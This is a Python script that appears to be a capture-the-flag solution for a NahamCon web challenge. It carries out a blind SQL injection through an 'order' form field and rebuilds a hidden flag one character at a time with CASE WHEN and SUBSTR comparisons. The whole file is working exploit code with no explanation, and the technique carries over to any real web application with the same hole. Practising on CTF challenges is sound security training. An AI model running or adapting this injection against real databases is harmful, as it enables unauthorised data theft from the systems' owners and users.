#!/usr/bin/env python3
from bs4 import BeautifulSoup
import requests as req
from string import printable
url = 'http://challenge.nahamcon.com:32715/'

flag = ''
position = 1
while True:
	for char in printable:
		if char in "'()\\|":
			continue
		data = {
			"search" : "f",
			"order" : f"(CASE WHEN (SELECT SUBSTR(flag,{position},1) FROM flag)='{char}' THEN atomic_number ELSE symbol END) DESC--"
		}

		r = req.post(url,data=data)

		soup = BeautifulSoup(r.text, 'html.parser')
		print(char,soup.body.td.text)
		if soup.body.td.text=='114':
			flag+=char
			print(flag)
			position+=1
			break

